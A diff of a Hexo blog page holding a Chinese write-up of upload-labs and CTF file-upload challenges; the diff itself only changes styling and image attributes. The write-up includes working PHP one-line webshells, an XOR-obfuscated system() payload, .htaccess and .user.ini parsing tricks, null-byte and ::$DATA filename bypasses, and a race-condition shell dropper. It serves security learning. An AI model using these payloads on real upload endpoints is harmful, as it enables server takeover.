@@ -50,10 +50,10 @@
 
 <!-- hexo injector head_end start -->
 <style>
-/* 背景图固定铺满（JS 随机选一张，见 body_end） */
+/* 背景图固定铺满（background-image 由 post.ejs 模板按文章封面注入） */
 body{background-color:#1a2430 !important;background-size:cover !important;background-attachment:fixed !important;background-position:center !important;background-repeat:no-repeat !important}
-/* 文章内容卡：高不透明度保证可读性 */
-.article{background:rgba(255,255,255,.95) !important;border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,.28) !important;padding:32px 40px !important}
+/* 文章内容卡：毛玻璃半透明，笔记与背景图都可见 */
+.article{background:rgba(255,255,255,.72) !important;border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,.28) !important;padding:32px 40px !important;backdrop-filter:blur(16px) saturate(1.25);-webkit-backdrop-filter:blur(16px) saturate(1.25)}
 .article .content{text-align:left}
 .article img{border-radius:8px}
 .article h1{color:#1f2d3d}
@@ -65,7 +65,7 @@ body{background-color:#1a2430 !important;background-size:cover !important;backgr
 h1,h2,h3,h4,h5,h6{scroll-margin-top:70px}
 html{scroll-behavior:smooth}
 /* 目录侧栏（宽屏显示） */
-#post-toc{background:rgba(255,255,255,.95);border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,.2);max-height:72vh;overflow-y:auto;padding:14px 16px;position:fixed;right:24px;top:90px;width:250px;z-index:50}
+#post-toc{background:rgba(255,255,255,.82);border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,.2);max-height:72vh;overflow-y:auto;padding:14px 16px;position:fixed;right:24px;top:90px;width:250px;z-index:50;backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px)}
 #post-toc .toc-head{color:#1f2d3d;font-size:15px;font-weight:700;margin-bottom:8px}
 #post-toc ul.toc{list-style:none;margin:0;padding:0}
 #post-toc ul.toc .toc-child{list-style:none;margin:0;padding-left:14px}
@@ -179,7 +179,11 @@ html{scroll-behavior:smooth}
 </transition>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            <div class="article">
+            
+<style>
+    body { background-image: url('https://cdn.jsdelivr.net/gh/Septins/img/img/4.jpg'); }
+</style>
+<div class="article">
     <div>
         <h1>文件上传</h1>
     </div>
@@ -200,7 +204,7 @@ html{scroll-behavior:smooth}
             
             <span class="tag">
                 
-                <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #ffa2c4">
+                <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #00a596">
                     笔记
                 </a>
             </span>
@@ -310,7 +314,7 @@ SetHandler application/x-httpd-php
 <p>.user.ini 作用:<br>特定于用户或特定目录的配置文件, 通常位于 Web 应用程序的根目录下。 它用于覆盖或追加全局配置文件（如 .php.ini）中的 PHP 配置选项。<br>作用范围: 存放该文件的目录以及其子目录 优先级: 较高, 可以覆盖 php.ini 生效方式: 立即生效</p>
 <p>php.ini 作用:<br>存储了对整个 PHP 环境生效的配置选项。它通常位于 PHP 安装目录中 作用范围: 所有运行在该 PHP 环境中的 PHP 请求<br>优先级: 较低 生效方式: 重启 php 或 web 服务器 </p>
 <p>对于优先级的理解： 加载方式：会首先加载 php.ini&#x2F;httpd-conf 文件中的配置。然而，如果在某个目录下存在  user.ini&#x2F;.htaccess 文件，服务器会在处理请求时检查该目录，并覆盖相应的配置项。 </p>
-<p>.user.ini 可以生效的前提：<br>最好大于 5.3.0，最好是用 7.X 版本的<br>Server API 为 CGI &#x2F; FastCGI — Phpinfo（）查看 Server API<br><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312212535722.png" alt="image-20260312212535722"></p>
+<p>.user.ini 可以生效的前提：<br>最好大于 5.3.0，最好是用 7.X 版本的<br>Server API 为 CGI &#x2F; FastCGI — Phpinfo（）查看 Server API<br><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312212535722.png" alt="image-20260312212535722"></p>
 <p>Server API 是指用于连接和交互的服务器端软件接口</p>
 <p> .user.ini 文件上传漏洞的前提：<br>.user.ini 可以生效并且该上传目录有 php 文件 </p>
 <p>在pass5中 </p>
@@ -318,14 +322,14 @@ SetHandler application/x-httpd-php
 <pre><code>auto_prepend_file=shell.jpg   //在上传文件之前都预先加载shell.jpg
 </code></pre>
 <p>上传该文件再上传shell.jpg访问&#x2F;readme.php连接蚁剑</p>
-<p>方法二：<br>点加空格加点绕过，针对下图一系列检查($img_path &#x3D; UPLOAD_PATH.’&#x2F;‘.$file_name;拼接的效果就是路径111.php.)<br><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312212716146.png" alt="image-20260312212716146"></p>
+<p>方法二：<br>点加空格加点绕过，针对下图一系列检查($img_path &#x3D; UPLOAD_PATH.’&#x2F;‘.$file_name;拼接的效果就是路径111.php.)<br><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312212716146.png" alt="image-20260312212716146"></p>
 <p>Windows会自动删除文件名后缀的·和空格 </p>
 <p>方法就是抓包从shell.php改成shell.php. .就可以，连接蚁剑时把后面的.去掉</p>
-<h4 id="pass-06-大写绕过"><a href="#pass-06-大写绕过" class="headerlink" title="pass 06 大写绕过"></a>pass 06 大写绕过</h4><p><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312212754052.png" alt="image-20260312212754052"></p>
+<h4 id="pass-06-大写绕过"><a href="#pass-06-大写绕过" class="headerlink" title="pass 06 大写绕过"></a>pass 06 大写绕过</h4><p><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312212754052.png" alt="image-20260312212754052"></p>
 <p>仔细观察源码可以发现，少了一个用strtolower()函数转化成小写的步骤只要将shell.php改成shell.PHp即可绕过，上传后用蚁剑连接</p>
-<h4 id="pass-07-空格绕过"><a href="#pass-07-空格绕过" class="headerlink" title="pass 07 空格绕过"></a>pass 07 空格绕过</h4><p><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312212906729.png" alt="image-20260312212906729"></p>
+<h4 id="pass-07-空格绕过"><a href="#pass-07-空格绕过" class="headerlink" title="pass 07 空格绕过"></a>pass 07 空格绕过</h4><p><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312212906729.png" alt="image-20260312212906729"></p>
 <p>源码没有删除空白，在Windows系统下尝试保存shell.php (后面有空格)发现最终保存的是shell.php， 后面的空格都被去掉了，利用这个特性，我们先上传shell.php，抓包将文件名改成shell.php .</p>
-<h4 id="pass-08-后缀加点绕过"><a href="#pass-08-后缀加点绕过" class="headerlink" title="pass 08  后缀加点绕过"></a>pass 08  后缀加点绕过</h4><p><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312212941322.png" alt="image-20260312212941322"></p>
+<h4 id="pass-08-后缀加点绕过"><a href="#pass-08-后缀加点绕过" class="headerlink" title="pass 08  后缀加点绕过"></a>pass 08  后缀加点绕过</h4><p><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312212941322.png" alt="image-20260312212941322"></p>
 <p>发现少了个删除点的操作，直接上传shell.php，抓包将文件名改成 shell.php. 这样代码最后检测的后缀只有一个 . 成功绕过，放包上传后，用蚁剑测试</p>
 <h4 id="pass-09-DATA绕过"><a href="#pass-09-DATA绕过" class="headerlink" title="pass 09  $DATA绕过"></a>pass 09  $DATA绕过</h4><p>前置知识：额外数据流</p>
 <pre><code>写入方法：  
@@ -334,13 +338,13 @@ type 文件名&gt;&gt;文件名:数据流名  
 查看方法：  
 notepad 文件名：数据流名
 </code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312213047315.png" alt="image-20260312213047315"></p>
+<p><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312213047315.png" alt="image-20260312213047315"></p>
 <p>第二条命令输出1.txt的内容。第三条命令输出你好。第5条命令输出2.txt的内容。然后删除2.txt之后。<br>第6条命令仍然输出2.TXT的内容。<br>就是一个附加数据流，查看1.txt仍然是本身的内容，看不到我加的你好等等。</p>
 <p>上传这个数据流不会经过后缀的检查，所以能传上去。</p>
 <p>对于pass09：<br>保存文件时用的是获取的文件后缀，这样就不能用上一关的方法了，前面少了一段删除::$DATA的代码。</p>
 <p>在 Windows 系统中， ::$DATA 是 一种数据流标识，也就是说正常读写shell.php和读写shell.php::$DATA是一样的，只是后面那种方式带上了数据流标识。直接上传shell.php，抓包将文件名改成shell.php::$DATA,这样代码最后获取到的文件后缀是.php::$DATA，成功绕过黑名单。 放包上传<br>后，在蚁剑测试连接（填写url时要删掉::$DATA）</p>
 <h4 id="pass-10-点加空格加点绕过"><a href="#pass-10-点加空格加点绕过" class="headerlink" title="pass 10  点加空格加点绕过"></a>pass 10  点加空格加点绕过</h4><p>点加空格加点绕过（第五关的方法二）</p>
-<h4 id="pass-11-双写后缀绕过"><a href="#pass-11-双写后缀绕过" class="headerlink" title="pass 11 双写后缀绕过"></a>pass 11 双写后缀绕过</h4><p><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312213455865.png" alt="image-20260312213455865"></p>
+<h4 id="pass-11-双写后缀绕过"><a href="#pass-11-双写后缀绕过" class="headerlink" title="pass 11 双写后缀绕过"></a>pass 11 双写后缀绕过</h4><p><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312213455865.png" alt="image-20260312213455865"></p>
 <p>这里str_ireplace()函数的作用是，将文件名中包含的所有黑名单数组中的元素都替换成空，但是只替换 了一次，将php双写成pphphp即可绕过。</p>
 <h4 id="pass-12-00"><a href="#pass-12-00" class="headerlink" title="pass 12  %00"></a>pass 12  %00</h4><p>空字符前置知识：<br>从左向右解析时，对于一些字符串当作结束符：0x00（代码里的空字节）和%00（url里的空字节编码）</p>
 <pre><code>$is_upload = false;
@@ -365,7 +369,7 @@ if(isset($_POST[&#39;submit&#39;])){
 }
 </code></pre>
 <p>本关改的是路径， $img_path &#x3D; $_GET[‘save_path’].”&#x2F;“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;说明 路径是可控的，之前的是 if (file_exists(UPLOAD_PATH))写死的不能改 </p>
-<p>上传： shell.jpg  → 后缀合法，过关。<br>在 save_path 里填： upload&#x2F;shell.php%00  代码拼接： upload&#x2F;shell.php%00 &#x2F; shell.jpg  服务器看到 %00 就截断了 → 最终保存成： upload&#x2F;shell.php<br><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312213744712.png" alt="image-20260312213744712"><br>新标签页打开图像在url里删去后面的 </p>
+<p>上传： shell.jpg  → 后缀合法，过关。<br>在 save_path 里填： upload&#x2F;shell.php%00  代码拼接： upload&#x2F;shell.php%00 &#x2F; shell.jpg  服务器看到 %00 就截断了 → 最终保存成： upload&#x2F;shell.php<br><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312213744712.png" alt="image-20260312213744712"><br>新标签页打开图像在url里删去后面的 </p>
 <p>#php 版本小于 5.3.29(最好用ts版的php，nts版的会上传失败)</p>
 <h4 id="pass-13-0x00"><a href="#pass-13-0x00" class="headerlink" title="pass 13 0x00"></a>pass 13 0x00</h4><p>与12关不同的是$img_path &#x3D; $_POST[‘save_path’].”&#x2F;“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;改包位置从url挪到body</p>
 <p>POST不能打字，要用任意（A）占位置，切换Hex面板找到A对应的16进制（41）改成00</p>
@@ -391,12 +395,12 @@ if(isset($_POST[&#39;submit&#39;])){
 }
 </code></pre>
 <p>意思是读取图片转化成十六进制后的前两字节<br>&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;可以用010editor修改头字节绕过，记得上传木马时先写两个占位符(aa)以便在工具中修改</p>
-<p>接把一句话木马文件的开头两字节改成FF D8，这样后端代码就会认为这是个jpg文件直接上传。<br>用010Editor打开shell.php，在文件最前面加上换行，在view-&gt;Edit As-&gt;Hex，这样就能用16进制打开该文件了，将开头两字符改成FF D8(这就是为什么要在前面加换行，这样才不会破坏一句话木马的内容)，保存成shell1.php直接上传即可。<br><img src="https://i-blog.csdnimg.cn/direct/63bba90f3fe147ca81fa0726b7e98923.png" alt="img"></p>
-<p>上传完在新标签页打开发现是个.jpg的文件，要如何当成php解析呢？别急，这关页面额外提供了个文件包含漏洞<br><img src="https://i-blog.csdnimg.cn/direct/2027c2ba2e6d46b7a08239732cae4207.png" alt="img"></p>
-<p>该文件正好是.php文件，只要将之前上传的文件包含进来就行<br><img src="https://i-blog.csdnimg.cn/direct/67af81b77804416db717920387d6a76c.png" alt="img"></p>
+<p>接把一句话木马文件的开头两字节改成FF D8，这样后端代码就会认为这是个jpg文件直接上传。<br>用010Editor打开shell.php，在文件最前面加上换行，在view-&gt;Edit As-&gt;Hex，这样就能用16进制打开该文件了，将开头两字符改成FF D8(这就是为什么要在前面加换行，这样才不会破坏一句话木马的内容)，保存成shell1.php直接上传即可。<br><img loading="lazy" decoding="async" src="https://i-blog.csdnimg.cn/direct/63bba90f3fe147ca81fa0726b7e98923.png" alt="img"></p>
+<p>上传完在新标签页打开发现是个.jpg的文件，要如何当成php解析呢？别急，这关页面额外提供了个文件包含漏洞<br><img loading="lazy" decoding="async" src="https://i-blog.csdnimg.cn/direct/2027c2ba2e6d46b7a08239732cae4207.png" alt="img"></p>
+<p>该文件正好是.php文件，只要将之前上传的文件包含进来就行<br><img loading="lazy" decoding="async" src="https://i-blog.csdnimg.cn/direct/67af81b77804416db717920387d6a76c.png" alt="img"></p>
 <p>注意当前路径是upload-labs，而上传的木马文件在upload-labs&#x2F;upload目录。</p>
 <p>然后蚁剑</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312163400126.png" alt="image-20260312163400126"></p>
+<p><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312163400126.png" alt="image-20260312163400126"></p>
 <h4 id="pass-15-图片马"><a href="#pass-15-图片马" class="headerlink" title="pass 15  图片马"></a>pass 15  图片马</h4><p>相比pass14是因为getimagesize()<br>getimagesize()返回结果说明:<br>索引 0 给出的是图像宽度的像素值<br>索引 1 给出的是图像高度的像素值<br>索引 2 给出的是图像的类型，返回的是数字，其中1 &#x3D; GIF，2 &#x3D; JPG，3 &#x3D; PNG，4 &#x3D; SWF，5 &#x3D; PSD，6 &#x3D; BMP，7 &#x3D; TIFF(intel byte order)，8 &#x3D; TIFF(motorola byte order)，9 &#x3D; JPC，10 &#x3D; JP2，11 &#x3D; JPX，12 &#x3D; JB2，13 &#x3D; SWC，14 &#x3D; IFF，15 &#x3D; WBMP，16 &#x3D; XBM<br>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签<br>索引 bits 给出的是图像的每种颜色的位数，二进制格式<br>索引 channels 给出的是图像的通道值，RGB 图像默认是 3<br>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如：header(“Content-type: image&#x2F;jpeg”);</p>
 <pre><code>if(file_exists($filename)){
         $info = getimagesize($filename);
@@ -419,10 +423,10 @@ if(isset($_POST[&#39;submit&#39;])){
 <li><strong>GIF</strong>：文件头以 <code>47 49 46 38</code> 开头。</li>
 <li><strong>BMP</strong>：文件头以 <code>42 4D</code> 开头</li>
 </ul>
-<p>这样的话和上一关一样，在shell.php的前面几个字节设为47 49 46 38(不要破坏木马内容)<br><img src="https://i-blog.csdnimg.cn/direct/a56374513531491181e7e556766f4632.png" alt="img"></p>
+<p>这样的话和上一关一样，在shell.php的前面几个字节设为47 49 46 38(不要破坏木马内容)<br><img loading="lazy" decoding="async" src="https://i-blog.csdnimg.cn/direct/a56374513531491181e7e556766f4632.png" alt="img"></p>
 <p>保存好后直接上传，利用文件包含漏洞包含带木马的文件，用蚁剑连接</p>
-<h4 id="pass-16-图片马"><a href="#pass-16-图片马" class="headerlink" title="pass 16 图片马"></a>pass 16 图片马</h4><p><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312192142248.png" alt="image-20260312192142248"></p>
-<p>可以直接用上一关的图片马，注意图中说的开启exif模块<br><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312192246310.png" alt="image-20260312192246310" style="zoom:50%;" /></p>
+<h4 id="pass-16-图片马"><a href="#pass-16-图片马" class="headerlink" title="pass 16 图片马"></a>pass 16 图片马</h4><p><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312192142248.png" alt="image-20260312192142248"></p>
+<p>可以直接用上一关的图片马，注意图中说的开启exif模块<br><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312192246310.png" alt="image-20260312192246310" style="zoom:50%;" /></p>
 <h4 id="pass-17-二次渲染"><a href="#pass-17-二次渲染" class="headerlink" title="pass 17  二次渲染"></a>pass 17  二次渲染</h4><pre><code>if (isset($_POST[&#39;submit&#39;])){
     // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
     $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
@@ -467,7 +471,7 @@ if(isset($_POST[&#39;submit&#39;])){
 <p>你原先藏在图片末尾的 PHP 代码：imagejpeg() 在生成新图片时，只保留像素数据，会丢弃所有额外附加的数据（如文件尾部的注释或木马代码）。</p>
 <p>最终保留的图片：是一张干干净净、由 PHP GD 库重新绘制的纯图片，不含任何木马。</p>
 <p>&#x2F;&#x2F;这里有个函数 imagecreatefromjpeg() 能将jpg图像重新渲染成一个新图像，最终存储的也是这个新图像，那问题是渲染过程中会不会把木马破坏掉呢？这里随便上传一个jpg图像，将渲染后的图像下载下来用010 Editor对比。</p>
-<p>两张图片都用010 Editor打开，点击Tools-&gt;Compare Files-&gt;Compare<br><img src="https://i-blog.csdnimg.cn/direct/e143755bae0b4f709b55ab692b4d2eb4.png" alt="img" style="zoom:33%;" /></p>
+<p>两张图片都用010 Editor打开，点击Tools-&gt;Compare Files-&gt;Compare<br><img loading="lazy" decoding="async" src="https://i-blog.csdnimg.cn/direct/e143755bae0b4f709b55ab692b4d2eb4.png" alt="img" style="zoom:33%;" /></p>
 <p>点左下角的match，蓝色部分是没渲染的，在蓝色部分里面粘贴木马<br>保存后上传，利用文件包含漏洞包含上传的文件</p>
 <p>如果蓝色部分特别少，不够插入（如png类一些图片），可以将二次渲染后的图片再次上传（不会对渲染之后的文件再次渲染），此时对第一次二次渲染之后的图片插入木马再上传，连接蚁剑即可</p>
 <h4 id="pass-18-条件竞争"><a href="#pass-18-条件竞争" class="headerlink" title="pass 18 条件竞争"></a>pass 18 条件竞争</h4><pre><code>if(isset($_POST[&#39;submit&#39;])){
@@ -497,13 +501,13 @@ if(isset($_POST[&#39;submit&#39;])){
 fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;pass&quot;]) ?&gt;&#39;);
 ?&gt;
 </code></pre>
-<p>执行时会帮我们写入一句话木马,  原理：上传和处理存在时间差，只要在服务端没反应过来前执行即可。需要注意的是，若只这样上传木马，即使可以有一瞬间上传上去，但是随后马上便会被删除。所以需要用木马生成木马，通过访问第一个马自己生成一个新马，而新生成的马并非用户上传的所以不会被检测删除。<br>绕过方法：在发大量上传文件的同时发送大量请求访问发送的文件。具体来说，抓两个包（上传和访问），发到intruder设好参数，同时暴力攻击。<br>注意上传的php文件是能生成新马的文件！<br>因为只需要不断的上传，所以清除掉所有的payload<br><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260313184835249.png" alt="image-20260313184835249"></p>
-<p>在有效载荷这里选择没有负载(null payload)，输入发送次数(如3000)<br><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260313184910376.png" alt="image-20260313184910376"></p>
-<p>拼运气上传成功就可访问<img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260313185020738.png" alt="image-20260313185020738"></p>
+<p>执行时会帮我们写入一句话木马,  原理：上传和处理存在时间差，只要在服务端没反应过来前执行即可。需要注意的是，若只这样上传木马，即使可以有一瞬间上传上去，但是随后马上便会被删除。所以需要用木马生成木马，通过访问第一个马自己生成一个新马，而新生成的马并非用户上传的所以不会被检测删除。<br>绕过方法：在发大量上传文件的同时发送大量请求访问发送的文件。具体来说，抓两个包（上传和访问），发到intruder设好参数，同时暴力攻击。<br>注意上传的php文件是能生成新马的文件！<br>因为只需要不断的上传，所以清除掉所有的payload<br><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260313184835249.png" alt="image-20260313184835249"></p>
+<p>在有效载荷这里选择没有负载(null payload)，输入发送次数(如3000)<br><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260313184910376.png" alt="image-20260313184910376"></p>
+<p>拼运气上传成功就可访问<img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260313185020738.png" alt="image-20260313185020738"></p>
 <p>拓展：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260426170651495.png" alt="image-20260426170651495"></p>
-<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312214206994.png" alt="image-20260312214206994"></p>
-<p>对于这道题（后缀.jpg会出现<br><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312214224674.png" alt="image-20260312214224674"></p>
+<p><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260426170651495.png" alt="image-20260426170651495"></p>
+<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312214206994.png" alt="image-20260312214206994"></p>
+<p>对于这道题（后缀.jpg会出现<br><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312214224674.png" alt="image-20260312214224674"></p>
 <p>还有已经试过传纯 木马都会被过滤【文件后缀(如php)都传不上去)</p>
 <p>尝试后.htaccess文件可以，如</p>
 <pre><code>&lt;FilesMatch &quot;你想让当做php文件执行的文件名&quot;&gt;
@@ -582,16 +586,16 @@ if __name__ == &quot;__main__&quot;:
     print(f&quot;&lt;?= {expr}; ?&gt;&quot;)
     print(f&quot;&lt;?php $a = {expr}; eval($a); ?&gt;&quot;)
 </code></pre>
-<p>就是system(ls &#x2F;)且 (表达式)(参数) 才是php合法形式，此处给脚本后的结果进行了加括号去中间一个.的 拼接符作用的处理得到根目录下的：<br><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312214805078.png" alt="image-20260312214805078"></p>
-<p>寻找flag文件： find &#x2F; -name fl* 然后借助脚本和语法要求拼出(system)(find &#x2F; -name fl )的异或拼接<img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312214836974.png" alt="image-20260312214836974"></p>
+<p>就是system(ls &#x2F;)且 (表达式)(参数) 才是php合法形式，此处给脚本后的结果进行了加括号去中间一个.的 拼接符作用的处理得到根目录下的：<br><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312214805078.png" alt="image-20260312214805078"></p>
+<p>寻找flag文件： find &#x2F; -name fl* 然后借助脚本和语法要求拼出(system)(find &#x2F; -name fl )的异或拼接<img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312214836974.png" alt="image-20260312214836974"></p>
 <p>尝试读取&#x2F;var&#x2F;www&#x2F;html&#x2F;flag的拼接，上传成功之后将文件名替换.htaccess(记得在该文件中修改你要生效的文件名)然后访问得到flag如：</p>
 <pre><code>&lt;?= ((&#39;(&#39;^&#39;[&#39;).(&#39;&quot;&#39;^&#39;[&#39;).(&#39;(&#39;^&#39;[&#39;).(&#39;(&#39;^&#39;\\&#39;).(&#39;%&#39;^&#39;@&#39;).(&#39;-&#39;^&#39;@&#39;))((&#39;#&#39;^&#39;@&#39;).(&#39;!&#39;^&#39;@&#39;).(&#39;(&#39;^&#39;\\&#39;).&#39; &#39;.&#39;/&#39;.(&#39;(&#39;^&#39;^&#39;).(&#39;!&#39;^&#39;@&#39;).(&#39;)&#39;^&#39;[&#39;).&#39;/&#39;.(&#39;(&#39;^&#39;_&#39;).(&#39;(&#39;^&#39;_&#39;).(&#39;(&#39;^&#39;_&#39;).&#39;/&#39;.(&#39;(&#39;^&#39;@&#39;).(&#39;(&#39;^&#39;\\&#39;).(&#39;-&#39;^&#39;@&#39;).(&#39;,&#39;^&#39;@&#39;).&#39;/&#39;.(&#39;&amp;&#39;^&#39;@&#39;).(&#39;,&#39;^&#39;@&#39;).(&#39;!&#39;^&#39;@&#39;).(&#39;\&#39;&#39;^&#39;@&#39;)); ?&gt;
 </code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312220804523.png" alt="image-20260312220804523"></p>
-<h2 id="BUU-UPLOAD-COURSE-1"><a href="#BUU-UPLOAD-COURSE-1" class="headerlink" title="BUU UPLOAD COURSE 1"></a>BUU UPLOAD COURSE 1</h2><p>直接上传一句话木马，<br><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260313193801167.png" alt="image-20260313193801167"></p>
+<p><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260312220804523.png" alt="image-20260312220804523"></p>
+<h2 id="BUU-UPLOAD-COURSE-1"><a href="#BUU-UPLOAD-COURSE-1" class="headerlink" title="BUU UPLOAD COURSE 1"></a>BUU UPLOAD COURSE 1</h2><p>直接上传一句话木马，<br><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260313193801167.png" alt="image-20260313193801167"></p>
 <p>然后直接访问<br><a target="_blank" rel="noopener" href="http://283d944a-fce5-42c8-b51d-a8b62c521e60.node5.buuoj.cn:81/index.php?file=uploads/69b3f362bb663.jpg">283d944a-fce5-42c8-b51d-a8b62c521e60.node5.buuoj.cn:81&#x2F;index.php?file&#x3D;uploads&#x2F;69b3f362bb663.jpg</a></p>
 <p>是空白然后用蚁剑连接在根目录下找到flag</p>
-<h2 id="GXYCTF2019-BabyUpload-1"><a href="#GXYCTF2019-BabyUpload-1" class="headerlink" title="[GXYCTF2019]BabyUpload  1"></a>[GXYCTF2019]BabyUpload  1</h2><p>不能ph后缀，另外<img src="https://i-blog.csdnimg.cn/blog_migrate/7e930ee4b5395fa8d1a1e4b194d0ff40.png" alt="img"></p>
+<h2 id="GXYCTF2019-BabyUpload-1"><a href="#GXYCTF2019-BabyUpload-1" class="headerlink" title="[GXYCTF2019]BabyUpload  1"></a>[GXYCTF2019]BabyUpload  1</h2><p>不能ph后缀，另外<img loading="lazy" decoding="async" src="https://i-blog.csdnimg.cn/blog_migrate/7e930ee4b5395fa8d1a1e4b194d0ff40.png" alt="img"></p>
 <p>编辑111.php :(这个木马与普通木马：有些安全软件的正则表达式只匹配&lt;?php或&lt;?，不会匹配<script language='php'>)</p>
 <pre><code>&lt;script language=&#39;php&#39;&gt;eval($_POST[&#39;v&#39;]);&lt;/script&gt;    
 </code></pre>
@@ -601,15 +605,15 @@ SetHandler application/x-httpd-php
 &lt;/FilesMatch&gt;
 </code></pre>
 <p>注意：</p>
-<p><img src="https://i-blog.csdnimg.cn/blog_migrate/c03fad71b4840bae6b7b2e229a44d7bf.png" alt="img"><img src="https://i-blog.csdnimg.cn/blog_migrate/2f4892ff52e327ebe51f41c94676eb7d.png" alt="img"></p>
-<p>然后再传木马<img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260314142031619.png" alt="image-20260314142031619"></p>
-<p>蚁剑连接<img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260314142157126.png" alt="image-20260314142157126" style="zoom: 33%;" /></p>
+<p><img loading="lazy" decoding="async" src="https://i-blog.csdnimg.cn/blog_migrate/c03fad71b4840bae6b7b2e229a44d7bf.png" alt="img"><img loading="lazy" decoding="async" src="https://i-blog.csdnimg.cn/blog_migrate/2f4892ff52e327ebe51f41c94676eb7d.png" alt="img"></p>
+<p>然后再传木马<img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260314142031619.png" alt="image-20260314142031619"></p>
+<p>蚁剑连接<img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260314142157126.png" alt="image-20260314142157126" style="zoom: 33%;" /></p>
 <h2 id="ACTF2020-新生赛-Upload-1"><a href="#ACTF2020-新生赛-Upload-1" class="headerlink" title="[ACTF2020 新生赛]Upload  1"></a>[ACTF2020 新生赛]Upload  1</h2><p>题目：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260314150022488.png" alt="image-20260314150022488"></p>
+<p><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260314150022488.png" alt="image-20260314150022488"></p>
 <p>还有就是前端验证：</p>
-<p><img src="https://i-blog.csdnimg.cn/blog_migrate/247dd09b038060a3a5de43499bf767c0.png" alt="img"></p>
-<p>因此将木马的后缀改为jpg再上传，在bp抓包，因为要使木马发挥作用，所以尝试在bp改后缀php3,php3,php7等，但会显示bad file，直到尝试.phtml，成功<img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260314150717833.png" alt="image-20260314150717833"></p>
